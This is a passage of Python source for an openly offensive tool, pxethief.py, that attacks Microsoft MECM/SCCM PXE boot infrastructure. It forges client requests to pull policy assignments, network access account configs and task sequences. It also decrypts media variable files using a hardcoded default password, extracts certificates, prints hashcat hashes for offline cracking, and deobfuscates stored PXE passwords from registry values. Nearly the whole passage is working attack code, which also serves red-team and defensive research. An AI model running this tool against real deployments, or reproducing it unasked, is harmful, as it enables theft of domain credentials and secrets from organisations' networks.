    first_payload = b'\xFF\xFE' + ('<Msg><ID/><SourceID>' + clientID + '</SourceID><ReplyTo>direct:OSD</ReplyTo><Body Type="ByteRange" Offset="0" Length="728"/><Hooks><Hook2 Name="clientauth"><Property Name="Token"><![CDATA[ClientToken:' + CCMClientID + ';' + CCMClientTimestamp + '\r\nClientTokenSignature:' + clientTokenSignature + '\r\n]]></Property></Hook2></Hooks><Payload Type="inline"/><TargetEndpoint>MP_PolicyManager</TargetEndpoint><ReplyMode>Sync</ReplyMode></Msg>').encode("utf-16-le")
    second_payload = ('<RequestAssignments SchemaVersion="1.00" RequestType="Always" Ack="False" ValidationRequested="CRC"><PolicySource>SMS:' + sitecode + '</PolicySource><ServerCookie/><Resource ResourceType="Machine"/><Identification><Machine><ClientID>' + clientID + '</ClientID><NetBIOSName></NetBIOSName><FQDN></FQDN><SID/></Machine></Identification></RequestAssignments>\r\n').encode("utf-16-le") + b'\x00\x00\x00'

    me = MultipartEncoder(fields={'Msg': (None, first_payload, "text/plain; charset=UTF-16"), 'RequestAssignments': second_payload})
    info("Requesting policy assignments from MP...")
    r = session.request("CCM_POST", sccm_base_url + "/ccm_system/request", data=me, headers={'Content-Type': me.content_type.replace("form-data", "mixed")})

    multipart_data = MultipartDecoder.from_response(r)

    policy_xml = zlib.decompress(multipart_data.parts[1].content).decode("utf-16-le")
    wf_policy_xml = "".join(c for c in policy_xml if c.isprintable())

    if DUMP_REPLYASSIGNMENTS_XML:
        with open("ReplyAssignments.xml", "w") as f:
            f.write(wf_policy_xml)

    allPoliciesURLs = {}
    root = ET.fromstring(wf_policy_xml)
    policyAssignments = root.findall("PolicyAssignment")
    dedup = 0

    for policyAssignment in policyAssignments:
        policies = policyAssignment.findall("Policy")
        for policy in policies:
            if policy.get("PolicyCategory") not in allPoliciesURLs and policy.get("PolicyCategory") is not None:
                allPoliciesURLs[policy.get("PolicyCategory")] = policy.find("PolicyLocation").text.replace("http://<mp>", sccm_base_url)
            else:
                if policy.get("PolicyCategory") is None:
                    allPoliciesURLs["".join(i for i in policy.get("PolicyID") if i not in r"\/:*?<>|")] = policy.find("PolicyLocation").text.replace("http://<mp>", sccm_base_url)
                else:
                    allPoliciesURLs[policy.get("PolicyCategory") + str(dedup)] = policy.find("PolicyLocation").text.replace("http://<mp>", sccm_base_url)
                    dedup = dedup + 1

    success(f"{len(allPoliciesURLs)} policy assignment URLs found!")

    headers = {'CCMClientID': CCMClientID, "CCMClientIDSignature": CCMClientIDSignature, "CCMClientTimestamp": CCMClientTimestamp, "CCMClientTimestampSignature": CCMClientTimestampSignature}

    if DUMP_POLICIES:
        POLICY_FOLDER_PREFIX = SCCM_BASE_URL[7:].lstrip("/").rstrip("/")
        policy_folder = os.getcwd() + "/" + POLICY_FOLDER_PREFIX + "_policies/"
        os.mkdir(policy_folder)
        for category, url in allPoliciesURLs.items():
            if category is not None:
                info(f"Requesting [bold]{category}[/] from: {url}")
                content = session.get(url, headers=headers)
                with open(policy_folder + category + ".xml", "wb") as f:
                    f.write(content.content)

    colsettings = []
    naaconfig = []
    tsconfig = []
    for category, url in allPoliciesURLs.items():
        if "NAAConfig" in category:
            info(f"Requesting NAA config from: [dim]{url}[/]")
            naaconfig.append(session.get(url, headers=headers))
        if "TaskSequence" in category:
            info(f"Requesting Task Sequence from: [dim]{url}[/]")
            tsconfig.append(session.get(url, headers=headers))
        if "CollectionSettings" in category:
            info(f"Requesting Collection Settings from: [dim]{url}[/]")
            colsettings.append(session.get(url, headers=headers))

    return naaconfig, tsconfig, colsettings

def write_default_config_file():
    config = configparser.ConfigParser(allow_no_value=True)

    config['SCAPY SETTINGS'] = {}
    scapy_cfg = config['SCAPY SETTINGS']
    scapy_cfg["AUTOMATIC_INTERFACE_SELECTION_MODE"] = "1"
    scapy_cfg["MANUAL_INTERFACE_SELECTION_BY_ID"] = ""

    config['HTTP CONNECTION SETTINGS'] = {}
    http = config['HTTP CONNECTION SETTINGS']
    http["USE_PROXY"] = "0"
    http["USE_TLS"] = "0"

    config['GENERAL SETTINGS'] = {}
    general = config['GENERAL SETTINGS']
    general["SCCM_BASE_URL"] = ""
    general["AUTO_EXPLOIT_BLANK_PASSWORD"] = "1"

    with open('settings.ini', 'w') as configfile:
        config.write(configfile)

BANNER = r"""[bold red]
 ________  ___    ___ _______  _________  ___  ___  ___  _______   ________
|\   __  \|\  \  /  /|\  ___ \|\___   ___\\  \|\  \|\  \|\  ___ \ |\  _____\
\ \  \|\  \ \  \/  / | \   __/\|___ \  \_\ \  \\\  \ \  \ \   __/|\ \  \__/
 \ \   ____\ \    / / \ \  \_|/__  \ \  \ \ \   __  \ \  \ \  \_|/_\ \   __\
  \ \  \___|/     \/   \ \  \_|\ \  \ \  \ \ \  \ \  \ \  \ \  \_|\ \ \  \_|
   \ \__\  /  /\   \    \ \_______\  \ \__\ \ \__\ \__\ \__\ \_______\ \__\
    \|__| /__/ /\ __\    \|_______|   \|__|  \|__|\|__|\|__|\|_______|\|__|
          |__|/ \|__|
[/]"""

def print_usage():
    console.print(BANNER)
    table = Table(box=box.SIMPLE, show_header=True, header_style="bold cyan", padding=(0, 2))
    table.add_column("Mode", style="bold yellow", no_wrap=True)
    table.add_column("Description")
    table.add_row("1", "Auto-discover PXE server via DHCP and download encrypted media file")
    table.add_row("2 <IP>", "Target a specific MECM Distribution Point by IP address")
    table.add_row("3 <file> [password]", "Decrypt media variables file and retrieve secrets from MECM")
    table.add_row("4 <file> <policy> [password]", "Decrypt media variables and Task Sequence from full media")
    table.add_row("5 <file>", "Print hashcat hash for offline cracking")
    table.add_row("6 <guid> <cert-file>", "Retrieve task sequences using DP registry key values")
    table.add_row("7 <hex-value>", "Decrypt stored PXE password from DP registry key Reserved1")
    table.add_row("8", "Write default settings.ini")
    table.add_row("10", "Print Scapy interface table")
    console.print(table)

if __name__ == "__main__":

    if len(sys.argv) < 2 or sys.argv[1] == "-h":
        print_usage()

    elif int(sys.argv[1]) == 10:
        console.print(BANNER)
        print_interface_table()

    elif int(sys.argv[1]) == 1:
        console.print(BANNER)
        info("Finding and downloading encrypted media variables file...")
        configure_scapy_networking(None)
        get_pxe_files(None)

    elif int(sys.argv[1]) == 2:
        console.print(BANNER)
        if len(sys.argv) != 3:
            error("Usage: pxethief.py 2 <ip address of MECM server>")
            sys.exit(0)
        info(f"Targeting MECM server at [bold]{sys.argv[2]}[/]")
        configure_scapy_networking(sys.argv[2])
        get_pxe_files(sys.argv[2])

    elif int(sys.argv[1]) == 3:
        console.print(BANNER)
        info("Attempting to decrypt media variables file and retrieve policies...")

        if not (len(sys.argv) == 4 or len(sys.argv) == 3):
            error("Usage: pxethief.py 3 <variables-file> <password>")
            sys.exit(0)

        if len(sys.argv) == 3:
            info("No password supplied — using default MECM media variables password")
            password = "{BAC6E688-DE21-4ABE-B7FB-C9F54E6DB664}"
        else:
            password = sys.argv[3]

        path = sys.argv[2]
        media_variables = decrypt_media_file(path, password)
        warning("Writing media variables to [bold]variables.xml[/]")
        write_to_file("variables", media_variables)

        root = ET.fromstring(media_variables.encode("utf-16-le"))
        smsMediaSiteCode = root.find('.//var[@name="_SMSTSSiteCode"]').text
        smsMediaGuid = (root.find('.//var[@name="_SMSMediaGuid"]').text)[:31]
        smsTSMediaPFX = binascii.unhexlify(root.find('.//var[@name="_SMSTSMediaPFX"]').text)
        filename = smsMediaSiteCode + "_" + smsMediaGuid + "_SMSTSMediaPFX.pfx"

        warning(f"Writing PFX to [bold]{filename}[/] (password: [bold]{smsMediaGuid}[/])")
        write_to_binary_file(filename, smsTSMediaPFX)
        auto_convert_pfx_to_pem(smsTSMediaPFX, smsMediaGuid.encode(), filename)

        process_pxe_bootable_and_prestaged_media(media_variables)

    elif int(sys.argv[1]) == 4:
        console.print(BANNER)
        info("Attempting to decrypt media variables and policy from stand-alone media...")

        if not (len(sys.argv) == 4 or len(sys.argv) == 5):
            error("Usage: pxethief.py 4 <variables-file> <policy-file> <password>")
            sys.exit(0)

        if len(sys.argv) == 4:
            info("No password supplied — using default MECM media password")
            password = "{BAC6E688-DE21-4ABE-B7FB-C9F54E6DB664}"
        else:
            password = sys.argv[4]

        path = sys.argv[2]
        policy_file = sys.argv[3]

        if password == "{BAC6E688-DE21-4ABE-B7FB-C9F54E6DB664}":
            media_variables = decrypt_media_file(path, password)
            root = ET.fromstring(media_variables.encode("utf-16-le"))
            smsMediaGuid = root.find('.//var[@name="_SMSMediaGuid"]').text
            process_full_media(smsMediaGuid, policy_file)
        else:
            process_full_media(password, policy_file)

    elif int(sys.argv[1]) == 5:
        console.print(BANNER)
        header = media_crypto.read_media_variable_file_header(sys.argv[2]).hex()
        found(f"Hashcat hash (AES-128): [bold]$sccm$aes128${header}[/]")
        found(f"Hashcat hash (AES-256): [bold]$sccm$aes256${header}[/]")

    elif int(sys.argv[1]) == 6:
        console.print(BANNER)
        info("Using MECM PXE Certificate registry key values to retrieve task sequences")

        identity = sys.argv[2]
        data("identityguid", identity)
        data("identitycert file", sys.argv[3])

        with open(sys.argv[3], "r") as f:
            cert = f.read()

        download_and_decrypt_policies_using_certificate(identity, cert)

    elif int(sys.argv[1]) == 7:
        console.print(BANNER)
        info("Decrypting stored PXE password from SCCM DP registry key Reserved1")
        reserved = deobfuscate_credential_string(sys.argv[2])
        cred("PXE Password", reserved[:reserved.rfind('\x00')])

    elif int(sys.argv[1]) == 8:
        console.print(BANNER)
        info("Writing default [bold]settings.ini[/]...")
        write_default_config_file()
        success("settings.ini written!")
